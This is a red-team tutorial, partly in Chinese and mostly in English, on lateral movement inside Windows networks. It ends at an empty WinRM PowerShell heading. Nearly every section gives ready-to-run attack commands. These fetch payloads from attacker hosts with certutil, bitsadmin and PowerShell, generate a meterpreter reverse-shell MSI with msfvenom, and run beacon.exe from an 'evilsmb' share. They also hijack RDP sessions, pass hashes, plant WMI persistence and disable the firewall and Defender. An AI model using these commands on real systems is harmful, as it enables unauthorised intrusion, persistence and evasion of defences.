# 内网横向移动

# 横向移动间的文件传输

## IPC横向移动

`Windows`系统中的网络共享功能可以实现局域网之间的文件共享，通过提供有效的用户凭据，用户可以轻松地将文件从一台主机传输到另一台主机。

命令`net share`可以获得`Windows`系统默认开启的网络共享，其中`C$`为`C`盘共享，`ADMIN$`为系统目录共享，另外还有一个便是`IPC$`共享。

`IPC`（`Internet Process Connection`）是共享“命名管道”的资源，为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通信并以此通道进行加密数据的交换，从而实现对远程计算机的访问。
在实战中，攻击者往往会建立`IPC$`连接，通过`IPC$`连接，不仅可以进行所有文件共享操作，还可以实现其他远程管理操作，如列出远程主机进程、在远程主机上创建计划任务或系统服务等。

建立`IPC$`连接需要具备以下两个条件：

- 知道目标机的账户密码；
- 远程主机开启了`IPC`连接；
- 远程主机的`139`端口和`445`端口是开放的。

命令：

```powershell
# 建立IPC连接
# net use \\<IP/Hostname>\IPC$ <Password> /user:"Username"
net use \\10.10.10.137\IPC$ "H3rmesk1t@2023" /user:"Administrator"

# 断开IPC连接
# net use \\<IP/Hostname>\ipc$ /del
net use \\10.10.10.137\IPC$ /del

# 查看是否建立连接
net use

# 执行命令, 列出远程主机的C盘Administrator用户共享目录
dir \\10.10.10.137\C$\Users\Administrator\

# 拷贝木马
copy beacon.exe \\10.10.10.137\C$

# 创建计划任务(at<2012, schtasks>=2012)
at \\10.10.10.137 00:00 C:\beacon.exe
```

![Untitled](%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%20784f931e99eb4194ad082bd2d99c37ec/Untitled.png)

## 搭建SMB服务器

`SMB`（`Server Message Block`，服务器消息块），主要功能是使网络上的计算机能够共享计算机文件、打印机、串行端口和通信等资源。`SMB`消息一般使用`NetBIOS`协议或`TCP`发送，分别使用端口`139`和`445`（主要）。

在实战中，攻击者可以在自己的主机上或所控内网主机上搭建`SMB`服务器，将需要横向传输的文件放入`SMB`服务器的共享目录，并指定`UNC`路径，让横向移动的目标主机远程加载`SMB`共享的文件。需要注意的是，要使用`SMB`匿名共享，并且搭建的`SMB`服务器能够被横向移动的目标所访问到。

实现方式：

- `Linux`系统上，通过`Impacket`项目提供的`smbserver.py`来搭建`SMB`服务器。

```bash
mkdir /root/share
python smbserver.py evilsmb /root/share -smb2support
```

- `Windows`系统上，如果已经获取了管理员权限，可以手动配置`SMB`匿名共享，也可以通过`Invoke-BuildAnonymousSMBServer`在本地快速启动一个匿名共享。

## 利用Windows自带工具

```bash
# Certutil, Certutil是Windows自带的命令行工具, 用于管理Windows证书并作为证书服务的一部分安装
certutil -urlcache -split -f http://IP:Port/shell.exe C:\beacon.exe

# BITSAdmin, Bitsadmin是一个Window命令行工具, 可以用于创建、下载或上载作业, 监视其进度, Win7及以后版本自带Bitsadmin工具
# 创建一个名为test的Bitsadmin任务, 下载shell.exe到本地
bitsadmin /transfer test http://IP:Port/shell.exe C:\beacon.exe

# Powershell, 可以通过创建WebClient对象来实现文件下载
(New-Object Net.WebClient).DownloadFile('http://IP:Port/shell.exe', 'C:\beacon.exe')
```

# 创建计划任务

## 常规利用流程

攻击者可以通过已有的`IPC`连接，在远程主机上创建计划任务，让目标主机在规定的时间节点或周期内执行特定操作，具体操作流程如下：

- 利用已建立的共享连接向远程主机上传攻击载荷；
- 利用已建立的`IPC`连接或指定用户凭据的方式在远程主机上创建计划任务，执行命令。

```powershell
# /S, 指定要连接到的系统; /TN, 指定要创建的计划任务的名称; /SC, 指定计划任务执行频率; /MO, 制定计划任务执行周期; /TR, 制定计划任务运行的程序路径; /RU, 制定计划任务运行的任务权限; /F, 如果指定的任务已经存在, 则强制创建
schtasks /Create /S 192.168.93.30 /TN Backdoor /SC minute /MO 1 /TR C:\beacon.exe /RU System /F

# 如果没有建立IPC连接, 也可以手动指定远程主机的用户凭据
schtasks /Create /S 192.168.93.30 /TN Backdoor /SC minute /MO 1 /TR C:\beacon.exe /RU System /F /U Administrator /P H3rmesk1t@123

# 立即启动计划任务
schtasks /RUN /S 192.168.93.30 /I /TN Backdoor

# 删除计划任务
schtasks /Delete /S 192.168.93.30 /TN Backdoor /F

# 利用计划任务在远程主机上执行系统命令
schtasks /Create /S 192.168.93.30 /TN Backdoor /SC minute /MO 1 /TR "C:\Windows\System32\cmd.exe /c 'whoami > C:\result.txt'" /RU System /F
type \\192.168.93.30\C$\result.txt
```

## UNC路径加载执行

`Windows`系统中使用`UNC`路径来访问网络共享资源，格式如下：

```powershell
\\servername\sharename\directory\filename
```

实现方式：

- 搭建SMB匿名共享服务，并将生成的攻击载荷放入共享目录（计划任务、创建服务、`PsExec`、`WMI`、`DCOM`等远程执行方法均可）
- 在远程主机创建计划任务，使用`UNC`路径加载位于`SMB`匿名共享中的攻击载荷并执行

```powershell
schtasks /Create /S 192.168.93.30 /TN Backdoor /SC minute /MO 1 /TR \\192.168.93.10\evilsmb\beacon.exe /RU System /F /U Administrator /P H3rmesk1t@123
```

# 利用系统服务

## 创建远程服务

除了创建计划任务，攻击者还可以通过在远程主机上创建系统服务的方式，在远程主机上运行指定的程序或命令，该攻击方式需要拥有两端主机的管理员权限和`IPC$`连接，具体操作如下：

- 利用已建立的共享连接向远程主机上传攻击载荷；
- 利用已建立的`IPC`连接在远程主机上创建系统服务，执行命令。

```powershell
# binpath指定服务启动时运行的二进制文件, 注意=后面需要由一个空格
sc \\192.168.93.30 create Backdoor binpath= "cmd.exe" /k C:\beacon.exe

# 立即启动创建的系统服务, 此时可能会提示错误, 但是已经获取了远程主机的权限
sc \\192.168.93.30 start Backdoor

# 删除服务
sc \\192.168.93.30 delete Backdoor
```

## SCShell

`SCShell`是一款利用系统服务的无文件横向移动工具，需要提供远程主机的管理员权限用户的凭据，并且需要知道远程主机上的系统服务名称，利用方法如下：

```powershell
# SCShell.exe <target> <service name> <payload> <domain> <username> <password>
SCShell.exe 192.168.93
.30 Backdoor "C:\Windows\System32\cmd.exe /c calc" hacker.com Administrator H3rmesk1t@123
```

# Remote Desktop Utilization

Remote Desktop Protocol (`RDP`) is a feature that Microsoft has provided since `Windows Server 2000`. Users can log in and manage remote hosts through this function. The remote desktop protocol listens to the `TCP 3389` port by default.

When other hosts in the intranet turn on remote desktop services, the attacker can use the acquired user credentials and other technologies to log in remotely, but this method may force logged out of the logged-in user and be easily discovered by the administrator.

## Determine whether the remote desktop is enabled

Query the registry to determine whether the current host has enabled the remote desktop function. If the return field value is `0`, it means that the `RDP` service has been started; if the return field value is `1`, it means that the `RDP` service has been disabled.

```powershell
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
```

Related commands to enable remote desktop function:

```powershell
# Enable remote desktop connection function
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
# Close "Allow connections to only computers running remote desktops using network-level authentication" (authorization)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0
# Set firewall policy to release port 3389
netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
# Turn off the firewall
netsh advfirewall set allprofiles state off
# Close Denfnder
net stop windefend
```

For remote hosts, you can also enable the remote desktop function through `WMI`:

```powershell
wmic /Node:10.10.10.137 /User:Administrator /Password:H3rmesk1t@2023 RDTOGGLE WHRER ServerName='win-98f4vaj03t5' call SetAllowTSConnections 1
```

![Untitled](%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%20784f931e99eb4194ad082bd2d99c37ec/Untitled%201.png)

## RDP Hijacking

For Windows computers that enable Remote Desktop Service, multiple sessions will be generated when multiple users log in. An attacker can hijack other users' RDP sessions with acquired SYSTEM permissions and successfully log into the target system without authorization, even if the user's session is disconnected. This attack method is called "RDP Hijacking".

Remote desktop hijacking requires the system's `SYSTEM` permission and execute the `tscon` command, which provides a function to switch user sessions. Under normal circumstances, when switching sessions, you need to provide the target user's login password, but under the `SYSTEM` permission, you can bypass verification and switch to the target user's session without entering the password.

You can use the `query user` command to list all logged in users to get the `ID` or use the `query session` to view the session.

Under the `SYSTEM` permission, you do not need to verify the password when switching users with `tscon <ID>`. In `MSF`, you can also simulate the specified user token by stealing the specified user process through `steal_token pid`.

![Untitled](%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%20784f931e99eb4194ad082bd2d99c37ec/Untitled%202.png)

For more attack methods against the `RDP` protocol, you can see [Utilization of the RDP protocol in Red and Blue Confrontation] (https://www.geekby.site/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8).

## Use Hash to log in to the rdp remote desktop

When the obtained user Hash cannot be cracked, if you use Hash to remotely log in to RDP, you need to enable Restricted Admin Mode (restricted administrator mode, the main function is to prevent the credentials from being exposed to the target system), it is enabled by default on Windows 8.1 and Windows Server 2012R2, and it is not supported by default on Windows 7 and Windows Server 2008 R2. Patches 2871997 and 2973351 are required.

Modify the registry method to use, the registry location is in `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`.

```powershell
# Create a new DWORD key value DisableRestrictedAdmin, a value of 0 means on, and a value of 1 means off
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f

# Check whether it is enabled DisableRestrictedAdmin, REG_DWORD 0x0 exists to enable it
REG query "HKLM\System\CurrentControlSet\Control\Lsa" | findstr "DisableRestrictedAdmin"

# Use reg.py in the impacket project to modify the registry
# Add registry key
python reg.py <domain>/<user>@<ip> -hashes :<hashe> add -keyName "HKLM\System\CurrentControlSet\Control\Lsa" -v "DisableRestrictedAdmin" -vt "REG_DWORD" -vd "0"

# View registry keys
python reg.py <domain>/<user>@<ip> -hashes :<hashe> add -keyName "HKLM\System\CurrentControlSet\Control\Lsa" -v "DisableRestrictedAdmin"

# Use xfreerdp to connect to rdp
xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:ip /cert-ignore
xfreerdp /u:Administrator /d:dar.com /pth:ac54ecea0c1d055abc1c7b3cfd960068 /v:172.77.4.100

# Use mimikatz to pth
privilege::debug
sekurlsa::pth /user:administrator /domain:dar.com /ntlm:ac54ecea0c1d055abc1c7b3cfd960068 "/run:mstsc.exe /restrictedadmin"
```

# ****Utilization of SMB protocol****

## PsExec remote control

`PsExec` is a practical `Windows` remote control tool officially provided by Microsoft. It can perform management operations on remote systems based on credentials and can obtain almost the same real-time interaction as the command line.

The principle of `PsExec` is to connect to the `Admin$` share of the server through `SMB`, and release a binary file named "`psexecsvc.exe`", and then register a service named "PSEXECSVC`". When the client executes the command, the server starts the corresponding program execution command through the PSEXECSVC service and echoes the data. After the run is completed, the `PSEXECSVC` service will be deleted.

The following conditions are required when using `PsExec` for remote operation:

1. The remote host has enabled `Admin$` sharing;
2. The `139` or `445` ports of the remote host need to be enabled, that is, the `SMB` service port, and the firewall needs to release the port;
3. Have permission to write files to shared folders;
4. Have a plain text password or `NTLM` hash;
5. Ability to create services on remote machines: `SC_MANAGER_CREATE_SERVICE`;
6. Able to start the created service: `SERVICE_QUERY_STATUS && SERVICE_START`.

`PsExec` usage:

```powershell
psexec.exe -accepteula \\10.10.10.137 -u HACK-MY\Administrator -p Admin@123 -s cmd
.exe

# -accepteula Disable the pop-up of license dialog box
# -u Specify the username of the remote host
# -p Specify the user's password
# -s Start the process with SYSTEM permission
```

In intranet penetration, if you already have the corresponding credentials (such as `IPC$` connection), you can directly use `PsExec` to connect to the remote host.

```powershell
PsExec.exe -accepteula \\10.10.10.137 -s cmd.exe
```

Both Impacket and Metasploit are built in scripts or modules that execute remote commands based on PsExec.

```powershell
#Impacket
python3 psexec.py domain/user:password@ip
python3 psexec.py domain/user@ip -hashes :161cff084477fe596a5db81874498a24

# Metasploit
use exploit/windows/smb/psexec
```

## ****SMBExec Remote Control****

Using `SMBExec`, you can execute commands in a remote system through file sharing (`admin$`, `c$`, `ipc$`, `d$`). It works similar to `PsExec`, but `SMBExec` does not put binary files on disk, and `SMBExec` uses a batch file and a temporary file to execute and forward messages.

Like `PSExec`, `SMBExec` sends inputs and receives outputs through the `SMB` protocol. The essence of `SMBExec` is still to first establish an IPC$` share, and then create and start the service on the target host through the `svcctl` protocol. However, the special thing is that it stores the commands that the user needs to execute in the service in the ImagePath` property. It is precisely based on this that every time the command is executed, a service needs to be created, and each time the command is executed, it will generate two service-related system log records: `7045` and `7009`.

The following conditions are required when using `SMBExec` for remote operation:

1. The `139` or `445` ports of the remote machine need to be turned on;
2. Turn on `IPC$` and `C$` to have permission to write files to shared folders;
3. Ability to create services on remote machines;
4. Ability to start the created service.

```powershell
#Impacket
python3 smbexec.py domain/user:password@ip
python3 smbexec.py domain/user@ip -hashes :161cff084477fe596a5db81874498a24

# -share SHARE Custom echo shared path, default is C$
# -mode {SHARE,SERVER} Set SHARE echo or SERVER echo, SERVER echo requires root linux
# -shell-type {cmd,powershell} Set the returned shell type
```

# Utilization of WMI

`WMI` (`Windows Management Instrumentation`, `Windows` Management Specification) is a core `Windows` management technology. Users can manage local and remote computers through `WMI`. `Windows` provides two available protocols for remote transmission of `WMI` data, namely the Distributed Component Object Model (`DCOM`) and `Window Remote Management`, WinRM`), so that the queries of `WMI` objects, event registration, execution of `WMI` class methods and class creation can all be run remotely.

When moving sideways, an attacker can use the management capabilities provided by WMI to interact with the local or remote host through the acquired user credentials and control it to perform various behaviors.

There are two common methods of utilization:

1. Remote calls by calling the WMI class method. For example, the Create method in the Win32_Process class can create a process on the remote host, and the Install method of the Win32_Product class can install malicious `MSI` on the remote host;
2. Remotely deploy the `WMI` event subscription, triggering an attack when a specific event occurs.

To use `WMI` for lateral movement, the following conditions are required:

1. The `WMI` service of the remote host is on (on by default);
2. The remote host firewall releases port 135, which is the default port managed by `WMI`.

## Conventional use methods

On Windows, you can use the WMI data and execute the WMI method through the `wmic.exe` and `PowerShell Cmdlet`.

```powershell
# wmic.exe is a command line tool that interacts with WMI. It has a large number of default alias for WMI objects and can execute many complex queries.
# Windows PowerShell provides many Cmdlets that can interact with WMI, such as Invoke-WmiMethod, Set-WmiInstance, etc.
```

- Perform remote query

```powershell
wmic /node:10.10.10.137 /user:Administrator /password:H3rmesk1t@2023 process list brief
# /node, specify the address of the remote host
# /user, specify the user name of the remote host
# /password, specify the user's password
```

- Create remote processes

```powershell
# Create a process on the remote host by calling Win32_Process.Create method and start CMD to execute the command. Since WMIC does not echo when executing the command, it can write the execution result to a file and then read the file in other ways.
wmic /node:10.10.10.137 /user:Administrator /password:H3rmesk1t@2023 process call create "cmd.exe /c ipconfig > C:\result.txt"
```

- Remote installation of `MSI` files

```powershell
# By calling the Win32_Product.Install method, you can control the remote host to install malicious MSI files, thereby obtaining permissions
# First use Metasploit to generate a malicious MSI file
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.31.207 LPORT=4445 -f msi -o shell.msi

# Then build an SMB shared server and put the generated MSI files into the shared directory. Then remotely load the malicious MSI files through the UNC path and install them.
mkdir /root/share
python3 smbserver.py evilsmb /root/share -smb2support

wmic /node:10.10.10.137 /user:Administrator /password:H3rmesk1t@2023 product call install PackageLocation="\\192.168.31.207\evilsmb\shell.msi"
```

## Common tools for utilization

### WMIExec

The `wmiexec.py` of the `Impacket` project can execute commands on a remote host through `WMI` in a fully interactive or semi-interactive manner. Note that the tool requires the remote host to enable ports `135` and `445`, where `445` is used to transfer echoes for command execution.

```powershell
python3 wmiexec.py HACK-MY/Administrator:H3rmesk1t\@2023@10.10.10.137

# python3 wmiexec.py <Domian>/<Username>:<Password>@<IP>
```

Under the Windows platform, you can use `PyInstaller` to package `wmiexec.py` into a separate `exe` executable file for running.

### Invoke-WmiCommand

`Invoke-WmiCommand.ps1` is a script in the `PowerSploit` project. You can remotely execute commands by calling `WMI` of `PowerShell`.

```powershell
# Remotely load the Invoke-WmiCommand.ps1 script
IEX(New-Object Net.Webclient).DownloadString('http://IP:Port/Invoke-WmiCommand.ps1')
# Specify the remote system username
$User = "HACK-MY\Administrator"
# Specify the user's password
$Password = ConvertTo-SecureString -String "H3rmesk1t@2023" -AsPlainText -Force
# Integrate username and password to import Credential
$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password
# Specify the IP of the remote host and the command to be executed
$Remote = Invoke-WmiCommand -Payload {ipconfig} -Credential $Cred -ComputerName "10.10.10.19"
# Execute echo
$Remote.PayloadOutput
```

### WMIHacker

Execute remote command without killing,
Common `WMIEXEC` and `PSEXEC` commands are to create a service or call `Win32_Process.create` to execute commands. These methods have been intercepted by soft-killing. `WMIHacker` is a tool for remote host connection. Command execution is performed through port `135` and no `445` port is required for file transfer.

The execution modes include `/cmd`, `/shell`, `/upload`, and `/download`, respectively, refer to executing commands, simulating `Shell`, uploading files, and downloading files.

```powershell
C:\Users\administrator\Desktop>cscript //nologo WMIHACKER_0.6.vbs

__ ____ ______ _ _______ __________ ________
\ \ / / \/ |_ _| | | | | | | /\ / ____| |/ / ____| ___ \
 \ \ /\ / /| \ / | | | | | | | |__| | / \ | | | | ' /| |__ | |__) |
  \ \/ \/ ​​/ | |\/| | | | | | | __ | / /\ \| | | < | __| | _ /
   \ /\ / | | | | |_| |_ | | | | | | | |/ _____ \ |____| . \| |_____| | \ \
    \/ \/ ​​|_| |_|______| |_| |_/_/ \_\_____|___|\______| \_\
                              v0.6beta By. Xiangshan@360RedTeam
Usage:
        WMIHACKER.vbs /cmd host user pass command GETRES?
        WMIHACKER.vbs /shell host user pass
        WMIHACKER.vbs /upload host user pass localpath remotepath
        WMIHACKER.vbs /download host user pass localpath remotepath

          /cmd single command mode
          host hostname or IP address
          GETRES? Res Need Or Not, Use 1 Or 0
          command the command to run on remote host
```

```powershell
# There is a command echo execution method
cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator "Password!" "systeminfo" 1

# No command echo
cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator "Password!" "systeminfo > c:\1.txt" 0

# Simulate Shell Mode
cscript WMIHACKER_0.6.vbs /shell 172.16.94.187 administrator "Password!"

# File Upload - Copy the native calc.exe to the remote host c:\calc.exe
cscript wmihacker_0.4.vbe /upload 172.16.94.187 administrator "Password!" "c:\windows\system32\calc.exe" "c:\calc"

# File download - Download remote host calc.exe to local c:\calc.exe
cscript wmihacker_0.4.vbe /download 172.16.94.187 administrator "Password!" "c:\calc" "c:\windows\system32\calc.exe"
```

## Utilization of WMI event subscriptions

`WMI` provides a powerful event processing system that can be used to respond to almost any event that occurs on the operating system.

For example, when a process is created, a pre-set script is executed through a `WMI` event subscription. Among them, the specific conditions that trigger the event are called "Event Filter", such as user login, new process creation, etc.; making corresponding events for the occurrence of a specified event is called "Event Consumer", including a series of specific operations, such as running scripts, recording logs, sending emails, etc. When deploying event subscriptions, you need to build two parts `Filter` and `Consumer` respectively and bind the two together.

All event filters are stored as an instance of the `Root\subscription:__EventFiilter` object. Event filters can be deployed by creating an instance of the `__EventFilter` object. Event consumers are classes derived from the `ROOT\subscription:__EventConsumer` system class.

As shown below, the system provides commonly used standard event consumption categories.

```powershell
LogFileEventConsumer # Write event data to the specified log file
ActiveScriptEventConsumer # Execute embedded VBScript or JavaScript
NTEventLogEventConsumer # Create an event log entry containing event data
SMTPEventConsumer # Send an email containing event data
CommandLineEventConsumer # Execute the specified system command
```

An attacker can use the functionality of WMI to deploy a permanent event subscription on a remote host and execute arbitrary code or system commands when it occurs at a specific time. Using the ActiveScriptEventConsumer and CommandLineEventConsumer of the WMI event consumption class, any attack load can be performed on a remote host, and this technology is mainly used for permission persistence on the target system.

### Manual use

Integrate `PSCredential` for authentication of subsequent processes:

```powershell
$Username = "HACK-MY/Administrator"
$Password = "H3rmesk1t@2023"
$SecurePassword = $Password | ConvertTo-SecureString -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, $SecurePassword
```

Set attack targets and other public parameters:

```powershell
$GlobalArgs = @{}
$ComputerName = "10.10.10.137"
$GlobalArgs['Credential'] = $Credential
$GlobalArgs['ComputerName'] = $ComputerName
```

Deploy the `TestFilter` event filter on the remote host to query the generation of the `svchost.exe` process. Since all event filters of WMI are stored as instances of the `Root\subscription:__EventFilter` object, you can create an instance of the `__EventFilter` class through the `Set-WmiInstance Cmdlet`:

```powershell
$EventFilterArgs = @{
    EventNamespace = "root/cimv2"
    Name = "TestFilter"
    Query = "Select * from Win32_ProcessStartTrace where processname = 'svchost.exe'"
    QueryLanguage = "WQL"
}
$EventFilter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $EventFilterArgs @GlobalArgs
```

Deploy an event consumer named `TestConsumer` on the remote host, create an instance of the event consumer class `CommandLineEventConsumer`, and execute system commands when the specified event occurs:

```powershell
$CommandLinEventConsumerArgs = @{
    Name = "TestConsumer"
    CommandLineTemplate = "C:\Windows\System32\cmd.exe /c calc.exe"
}
$EventConsumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEv
entConsumer -Arguments $CommandLineEventConsumerArgs @GlobalArgs
```

Bind the created event filter and the event consumer together:

```powershell
$FilterConsumerBindingArgs = @{
    Filter = $EventFilter
    Consumer = $EventConsumer
}
$FilterConsumerBinding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $FilterConsumerBindingargs @GlobalArgs
```

In this way, an event subscription has been deployed on the remote host. When the remote system polls the `svchost.exe` process, the `calc.exe` process will be started by executing the system commands by the event consumer.

### Sharp-WMIEvent

Refer to the project [Sharp-WMIEvent](https://github.com/wh0amitz/Sharp-WMIEvent), the script will deploy a named permanent event subscription on the remote host and execute the attack payload in the SMB share every `60s` to bring the remote host online.

# Utilization of DCOM

## COM and DCOM

- `COM`

`COM` (`Component Object Model`, Component Object Model) is a binary interface standard composed of Microsoft's software, making inter-process communication and dynamic object creation possible across programming languages.

`COM` specifies an object model and programming requirements to enable COM objects to interact with other objects. These objects can be in a single process, in other processes, or even in remote computers.

In Windows, each COM object is identified by a unique `128` bit binary identifier, i.e. `GUID`.

- `DCOM`

`DCOM` (`Distracted Component Model`, distributed component object model) is a series of concepts and program interfaces based on `COM`, which supports communication between components on different machines. With `DCOM`, the client program object can request a server program object from another computer in the network.

## Use DCOM for horizontal movement

Some `DCOM` components expose interfaces that may contain unsafe methods. For example, the ExecuteShellCommand method provided by `MMC20.Application` can run a specified program or command in a separate process.

Execute the following command to list all the `DCOM` program components on your computer:

```powershell
Get-CimInstance Win32_DCOMApplication

# Windows 7 and Windows Server 2008 are powershell 2.0 installed by default, so they do not support Get-CimInstance
Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication
```

![Untitled](%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%20784f931e99eb4194ad082bd2d99c37ec/Untitled%203.png)

Currently, the `DCOM` components that are frequently used include: `MMC20.Application`, `ShellWindows`, `Excel.Application`, `ShellBrowserWindow`, etc.

Using `DCOM` to execute commands on a remote host requires the following conditions:

1. PowerShell with administrator privileges;
2. The firewall is not enabled on the remote host;
3. When executing commands on a remote host, you must use the domain-managed Administrator account or an account with administrator privileges on the target host.

### MMC20.Application

There is an ExecuteShellCommand method under the Document.ActiveView of the `MMC20.Application` object, which can be used to start a child process and run executed programs or system commands.

```powershell
# Example of remote interaction with DCOM through progID and creating an MMC20.Application object
$com = [activate]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.137"))

# Call the ExecuteShellCommand method to start the process and run the attack payload
$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c \\192.168.31.207\evilsmb\shell.exe", "Minimized")

# merge one sentence
[activate]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.137")).Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c ipconfig > C:\\Hacked.txt", "Minimized")
```

### ShellWindows

The `ShellWindows` component provides the `Document.Application.ShellExecute` method, which is suitable for `Windows7` and above systems.

```powershell
# Since the ShellWindows object does not have a ProgID, it is necessary to use its CLSID to create an instance. The CLSID of the ShellWindows object can be found through OleViewDotNet. The CLSID of the ShellWindows object is 9BA05972-F6A8-11CF-A442-00A0C90A8F39
# Create an instance of Shell Windows object through PowerShell remotely interact with DCOM
$com=[Activator]::CreateInstance([Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"10.10.10.137"))

# Then execute the following command, and we can call the "ShellExecute" method of the object to start the process on the remote host
$com.item().Document.Application.ShellExecute("cmd.exe","/c C:\shell.exe","C:\windows\system32",$null,0)

# Complete command
[Activator]::CreateInstance([Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"10.10.10.137")).item().Document.Application.ShellExecute("cmd.exe","/c C:\shell.exe","C:\windows\system32",$null,0)
```

### Excel.Application

```powershell
# Remote interaction with DCOM through PowerShell to create an instance of the Excel.Application object:
$com = [activate]::CreateInstance([type]::GetTypeFromprogID("Excel.Application","10.10.10.137"))
$com.DisplayAlerts = $false

# Then execute the following command, and we can call the "DDEInitiate" method of the object to start the process on the remote host:
$com.DDEInitiate("cmd.exe","/c C:\shell.exe")
```

### ShellBrowserWindow

There is also a `Document.Application.ShellExecute` method in `ShellBrowserWindow`, which is the same as `ShellWindows`, but does not create a new process, but instead hosts child processes through the existing `explorer.exe`. Suitable for `Windows10` and `Windows Server 2012 R2` versions.

```powershell
# Remote interaction with DCOM through PowerShell to create an instance of the Excel.Application object:
$com = [activater]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","10.10.10.137"))

# Then execute the following command, and we can call the "shellExecute" method of the object to start the process on the remote host:
$com.Document.Application.shellExecute("C:\shell.exe")

# Complete command:
[activate]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","10.10.10.137")).Document.Application.shel
lExecute("C:\shell.exe")
```

### Visio.Application

`Visio` is required to be installed in the target host.

```powershell
# Create an instance of the Visio.Application object by remote interaction with DCOM through PowerShell:
$com = [activate]::CreateInstance([type]::GetTypeFromProgID("Visio.Application","10.10.10.137"))

# Then execute the following command, and we can call the "shellExecute" method of the object to start the process on the remote host:
$com.[0].Document.Application.shellExecute("calc.exe")

# Complete command:
[activate]::CreateInstance([type]::GetTypeFromProgID("Visio.Application","10.10.10.137")).[0].Document.Application.shellExecute("C:\shell.exe")
```

### Outlook.Application

You need to have `Outlook` installed in the target host, and create a `Shell.Application` object through `Outlook` to implement command line execution.

```powershell
# Create an instance of the Visio.Application object by remote interaction with DCOM through PowerShell:
$com = [activate]::CreateInstance([type]::GetTypeFromProgID("Outlook.Application","10.10.10.137"))

# Then execute the following command, create the Shell.Application object through Outlook and execute the command:
$com.createObject("Shell.Application").shellExecute("C:\shell.exe")

# Complete command:
[activate]::CreateInstance([type]::GetTypeFromProgID("Outlook.Application","10.10.10.137")).createObject("Shell.Application").shellExecute("C:\shell.exe")
```

# Utilization of WinRM

`WinRM` is implemented remote management by executing the `WS-Management` protocol (Web service protocol for remote software and hardware management), allowing `Windows` computers in a common network to access and exchange information with each other, and the corresponding port is `5985`. After one computer enables the WinRM service, the firewall will automatically release its relevant communication ports, and it can be remotely managed through WinRM on another computer.

Note that the WinRM service will start automatically only in servers with `Windows Server 2008` or above. When an attacker uses WinRM for horizontal movement, he needs to have the administrator credential information of the remote host.

## Execute remote commands through WinRM

`Windows` Remote Management provides the following two command line tools:

1. `Winrs`, a command-line tool that allows remote command execution, utilizes the `WS-Management` protocol;
2. `Winrm` (`Winrm.cmd`), a built-in system management command line tool, allowing administrators to configure the native `WinRM` service.

By default, it is not possible to connect to the target system via `WinRM`. When you use the above two command line tools for the first time to connect to WinRM, you may get the following error: "`Winrs error`: The WinRM client cannot process the request".

Default authentication can be used in conjunction with `IP` addresses under the following conditions:

1. The transmission is `HTTPS` or the target is in the `TrustedHosts` list and provides explicit credentials;
2. Use `Winrm.cmd` to configure `TrustedHosts`.

Execute the following command to manually add the target's `IP` address to `TrustedHosts`:

```powershell
winrm set winrm/config/client @{TrustedHosts="10.10.10.137"}

# Set TrustedHosts to * via powershell, so that all hosts are trusted
set-Item WSMan:localhost\client\trustedhosts -value *
```

### Winrs

`Winrs` is a client program provided by remote management on Windows, allowing commands to be executed on a server running `WinRM` through the provided user credentials. Both parties to the communications are required to install the `WinRM` service.

```powershell
# Execute system commands
winrs -r:http://10.10.10.137:5985 -u:Administrator -p:H3rmesk1t@2023 "whoami"

# Get the remote interactive command line
winrs -r:http://10.10.10.137:5985 -u:Administrator -p:H3rmesk1t@2023 "cmd"
```

![Untitled](%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%20784f931e99eb4194ad082bd2d99c37ec/Untitled%204.png)

### Winrm.cmd

`Winrm.cmd` allows `WMI` objects to interact remotely through `WinRM` transfer, enumerating `WMI` object instances or calling `WMI` class methods on local or remote computers. For example, you can create a remote instance by calling the `Create` method of the `Win32_Process` class.

```powershell
# In actual combat, an attack payload can be executed remotely
winrm invoke create wmicimv2/win32_process -SkipCAcheck -skipCNcheck @{commandline="notepad.exe"} -r:http://10.10.10.137:5985 -u:Administrator -p:H3rmesk1t@2023
```

![Untitled](%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%20784f931e99eb4194ad082bd2d99c37ec/Untitled%205.png)

## Get interactive sessions through WinRM

### PowerShell

